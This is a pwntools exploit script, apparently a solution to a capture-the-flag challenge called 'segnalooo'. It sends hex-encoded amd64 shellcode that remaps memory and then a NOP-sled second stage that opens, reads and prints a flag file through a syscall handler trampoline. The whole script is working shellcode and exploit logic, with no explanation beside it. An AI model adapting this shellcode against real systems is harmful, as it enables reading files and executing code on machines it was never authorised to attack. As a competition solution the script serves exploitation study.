from pwn import *

DEBUG = True
LOCAL = True

if LOCAL:
    p = process("./stub_patch")
else:
    p = remote("segnalooo.challenges.ooo", 4321)

if DEBUG:
    context.log_level = "DEBUG"

sla = p.sendlineafter
sl = p.sendline
rl = p.recvline
ru = p.recvuntil

rl()

payload = "f1"

context.arch = 'amd64'
handler_addr = 0x10000dead000
offset = 0x192
sc = asm(
'''
    add sp, 0x100
    mov rcx, 0x%x
    sub bx, 0xfc9
    mov rdi, rbx
    mov si, 0x2000
    mov dl, 7
    add bx,0xff0
    push rbx
    pop rbx
    mov al, 0xa
    jmp rcx
    xchg   rsi,rdx
    xchg rsi, rdi
    xor rdi, rdi
    sub cx, 1
    jmp rcx
''' % (handler_addr + offset)
)

payload += sc.encode('hex')
gdb.attach(p)

print(payload, len(payload))


p.sendline(payload)

payload = "\x90" * 0x1000
payload += asm(
'''
    mov r8, 0x%x
    add rsp, 0x100
    jmp _push_filename
_readfile:
    pop rdi 
    xor byte ptr [rdi + 5], 0x41
    xor rax, rax
    add al, 2
    xor rsi, rsi
    call this
this:
    pop rcx
    add cx, 10
    push rcx
    pop rcx
    jmp r8
    
    mov rsi, rsp
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0xff
    xor rax, rax
    call this2
this2:
    pop rcx
    add cx, 10
    push rcx
    pop rcx
    jmp r8
    
    xor rdi, rdi
    add dil, 1
    mov rdx, rax
    xor rax, rax
    add al, 1
    call this3
this3:
    pop rcx
    add cx, 10
    push rcx
    pop rcx
    jmp r8
_push_filename:
    call _readfile
'''% (handler_addr + offset)
)
payload += "/flagA"


p.send(payload)

p.interactive()